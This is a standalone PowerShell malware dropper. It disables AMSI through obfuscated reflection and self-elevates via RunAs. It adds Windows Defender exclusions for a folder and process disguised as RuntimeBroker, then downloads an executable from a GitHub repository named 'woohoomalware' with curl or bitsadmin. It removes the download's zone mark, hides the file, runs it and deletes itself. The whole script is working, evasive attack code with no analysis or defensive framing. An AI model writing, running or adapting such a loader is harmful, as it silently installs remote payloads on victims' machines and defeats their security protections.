# AMSI bypass (Obfuscated)
try { 
    $s1 = 'System.Management.Automation.A' + 'msiUtils'
    $s2 = 'amsi' + 'InitFailed'
    $type = [Ref].Assembly.GetType($s1)
    $field = $type.GetField($s2,'NonPublic,Static')
    $field.SetValue($null,$true) 
} catch {}

# Self-elevate
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(544)) {
    $t = Join-Path $env:LOCALAPPDATA 'wsync.ps1'
    Copy-Item $PSCommandPath $t -Force -EA 0
    Start-Process powershell ("-NoP -EP Bypass -W 1 -File `"$t`"") -Verb RunAs
    Exit
}

# Config
$d = Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps\RuntimeBroker'
$n = 'RuntimeBroker.exe'
$p = Join-Path $d $n
$u = 'https://github.com/woohoomalware/WeAreDanger/raw/refs/heads/main/test.exe'

# AV exclusion FIRST
try { 
    $mp = 'Add-Mp' + 'Preference'
    $ep = '-Exclusion' + 'Path'
    $eProc = '-Exclusion' + 'Process'
    Invoke-Expression "& $mp $ep `"$d`" -EA 0"
    Invoke-Expression "& $mp $eProc `"$n`" -EA 0"
} catch {}

# Create dir
New-Item $d -ItemType Directory -Force -EA 0 | Out-Null

# Download
$c = 'cu' + 'rl.exe'
$cArgs = "-L -s -o `"$p`" --http1.1 --ssl-no-revoke -k --max-time 30 `"$u`""
Invoke-Expression "& $c $cArgs 2>`$null"

# Fallback: bitsadmin
if (-not (Test-Path $p)) {
    $b = 'bits' + 'admin.exe'
    $bArgs = "/transfer j /download /priority foreground `"$u`" `"$p`""
    Invoke-Expression "& $b $bArgs 2>`$null"
}

# Run
if (Test-Path $p) {
    Remove-Item ($p+':Zone.Identifier') -Force -EA 0
    Unblock-File $p -EA 0
    $a = 'att' + 'rib.exe'
    Invoke-Expression "& $a +H +S `"$d`" 2>`$null"
    Invoke-Expression "& $a +H +S `"$p`" 2>`$null"
    & cmd.exe /C start "" "$p"
}

# Cleanup
Remove-Item (Join-Path $env:LOCALAPPDATA 'wsync.ps1') -Force -EA 0
if ($PSCommandPath) { 
    $cmdPath = 'cmd' + '.exe'
    $cmdArg = '/C ping 127.0.0.1 -n 3 >nul & del /f /q'
    Start-Process $cmdPath ("$cmdArg `"$PSCommandPath`"") -WindowStyle Hidden 
}
exit
